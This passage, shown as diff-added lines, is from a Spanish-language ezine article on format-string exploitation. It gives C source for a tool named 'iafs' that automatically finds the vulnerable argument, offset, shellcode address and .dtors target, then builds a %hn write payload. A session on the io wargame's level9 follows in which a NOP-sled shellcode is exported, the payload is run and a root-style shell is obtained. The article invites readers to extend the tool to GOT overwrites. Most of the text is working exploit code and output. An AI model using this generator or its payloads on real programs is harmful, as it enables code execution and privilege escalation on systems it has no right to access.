+   sc_addr = (unsigned long)getenv("SHELLCODE");
+   if (sc_addr != 0)
+      printf("\n[+] Direccion Shellcode: ( %p )", sc_addr);
+   else {
+      printf("\n[X] ERROR: Establezca la variable de entorno SHELLCODE\n");
+      exit(-1);
+   }
+}
+
+void exploit(void)
+{
+   int ta[4];
+   int i = 1;
+   unsigned int hob, lob;
+   char magicbomb[1024];
+
+   lob = sc_addr & 0xFFFF;
+   hob = sc_addr >> 16;
+   printf("\n[+] HOB = 0x%x", hob);
+   printf("\n[+] LOB = 0x%x", lob);
+
+   ta[0] = (target_addr >> 24) & 0xFF;
+   ta[1] = (target_addr >> 16) & 0xFF;
+   ta[2] = (target_addr >> 8) & 0xFF;
+   ta[3] = target_addr & 0xFF;
+
+   if (hob < lob) {
+      sprintf(magicbomb, "`perl -e 'print \"\\x%02x\\x%02x\\x%02x\\x%02x"     \
+                                           "\\x%02x\\x%02x\\x%02x\\x%02x\"'`" \
+                                           "%s%d%s%d%s%d%s%d%s",              \
+                                           ta[3]+2,ta[2],ta[1],ta[0],         \
+                                           ta[3],ta[2],ta[1],ta[0],           \
+                                           "%.", hob-8, "x%", offset,         \
+                                           "\\$hn%.", lob-hob, "x%",          \
+                                                 offset+1, "\\$hn");
+   }
+
+   else if (hob > lob) {
+      sprintf(magicbomb, "`perl -e 'print \"\\x%02x\\x%02x\\x%02x\\x%02x"     \
+                                           "\\x%02x\\x%02x\\x%02x\\x%02x\"'`" \
+                                           "%s%d%s%d%s%d%s%d%s",              \
+                                           ta[3]+2,ta[2],ta[1],ta[0],         \
+                                           ta[3],ta[2],ta[1],ta[0],           \
+                                           "%.", lob-8,"x%",offset+1,         \
+                                           "\\$hn%.", hob-lob, "x%",          \
+                                                   offset, "\\$hn");
+   }
+
+   printf("\n\n[+++] Su paquete bomba: [ %s ", vuln_prog);
+   while (i++ < vuln_param) {
+      printf("A ");
+   }
+   printf("%s ]\n\n", magicbomb);
+}
+
+void analisis(int mode)
+{
+   if (mode) {
+      printf("\n[!] Entrando en el modo Inteligente");
+      find_param();
+      find_offset();
+      find_shell();
+      find_target();
+      exploit();
+   }
+   else {
+      printf("\n[!] Entrando en el modo Normal");
+      exploit();
+   }
+}
+
+void usage(char *prog)
+{
+   printf("\nUsage: %s [opts] app\n", prog);
+   printf(" -i: Modo Inteligente\n");
+   printf(" -t: DTORS_END o GOT\n");
+   printf(" -s: Direccion SHELLCODE\n");
+   printf(" -p: Parametro Vulnerable\n");
+   printf(" -o: Offset\n");
+}
+
+int main(int argc, char *argv[])
+{
+   int op;
+   int ia_mode = 0;
+
+   while ((op = getopt(argc, argv, "it:s:o:p:")) != -1) {
+      switch (op) {
+         case 'i': {
+            ia_mode = 1;
+            break;
+         }
+         case 't': {
+            target_addr = strtoul(optarg, NULL, 16);
+            break;
+         }
+         case 's': {
+            sc_addr = strtoul(optarg, NULL, 16);
+            break;
+         }
+         case 'p': {
+            vuln_param = atoi(optarg);
+            break;
+         }
+         case 'o': {
+            offset = atoi(optarg);
+            break;
+         }
+         default: {
+            usage(argv[0]);
+            exit(0);
+         }
+      }
+   }
+
+   if(argc == optind) {
+      usage(argv[0]);
+      exit(-1);
+   }
+
+   if (strstr(argv[optind], "/") == 0) {
+      strncpy(vuln_prog, "./", 3);
+      strncat(vuln_prog, argv[optind], 28);
+   } else
+      strncpy(vuln_prog, argv[optind], 31);
+
+   analisis(ia_mode);
+   
+   printf("\n");
+   return 0;
+}
+
+[--- iafs.c ---]
+
+
+Vamos a verlo en accion con el programa vulnerable del torneo:
+
+level9@io:/tmp$ export SHELLCODE=`perl -e 'print "\x90"x512'``cat /tmp/sc`
+level9@io:/tmp$ ./iafs -i /levels/level9
+
+[!] Entrando en el modo Inteligente
+[!] Buscando argumentos vulnerables
+[+] Parametro vulnerable: ( 1 )
+[!] Buscando valor de OFFSET
+[+] Offset encontrado: ( 4 )
+[!] Configurando SHELLCODE
+[+] Direccion Shellcode: ( 0xbfffdc93 )
+[!] Buscando seccion DTORS en la aplicacion
+[+] Direccion DTORS_END encontrada: ( 0x08049514 )
+[+] HOB = 0xbfff
+[+] LOB = 0xdc93
+
+[+++] Su paquete bomba: [ /levels/level9 `perl -e 'print
+          "\x16\x95\x04\x08\x14\x95\x04\x08"'`%.49143x%4\$hn%.7316x%5\$hn ]
+
+
+level9@io:/tmp$ /levels/level9 `perl -e 'print
+            "\x16\x95\x04\x08\x14\x95\x04\x08"'`%.49143x%4\$hn%.7316x%5\$hn
+[00000000000000000..........
+
+............0000000000000000]
+sh-3.1$ exit
+exit
+level9@io:/levels$
+
+Una vez vistos los parametros encontrados de forma automatica, puedes probar
+si el modo manual funciona con los mismos valores:
+
+level9@io:/tmp$ ./iafs -p 1 -o 4 -t 0x08049514 -s 0xbfffdc93 /levels/level9
+
+[!] Entrando en el modo Normal
+[+] HOB = 0xbfff
+[+] LOB = 0xdc93
+
+[+++] Su paquete bomba: [ /levels/level9 `perl -e 'print
+          "\x16\x95\x04\x08\x14\x95\x04\x08"'`%.49143x%4\$hn%.7316x%5\$hn ]
+
+level9@io:/tmp$ 
+
+Puedes observar que la cadena creada es exactamente la misma. Asi que, ahora
+ya solo te queda disfrutarlo. Te animo a que modifiques el programa para
+mejorar el control de errores y sobre todo para agregar la capacidad de
+sobreescribir entradas en la GOT.
+
+
+
+---[ 7 - Conclusion
+
+En este articulo se ha pretendido mostrar de un modo sencillo, claro, y
+practico, el modo en como esta clase de vulnerabilidades actuan y como
+pueden ser explotadas en nuestro beneficio.
+
+Ademas, hemos proporcionado una pequeña aplicacion que te permite ahorrar
+tiempo automatizando la busqueda de parametros vulnerables, desplazamientos
+y objetivos susceptibles de ser sobreescritos.
+
+Como siempre, cualquier sugerencia sera bienvenida.
+
+Un abrazo!
+blackngel
+
+
+
+---[ 8 - Referencias
+
+ [1] Overflows en Linux x86_64 by Raise
+     http://www.set-ezine.org/ezines/set/txt/set34.zip
+
+ [2] Armouring the ELF: Binary encryption on the UNIX platform by grugq
+     http://www.phrack.org/issues.html?issue=58&id=5#article
+
+
+*EOF*
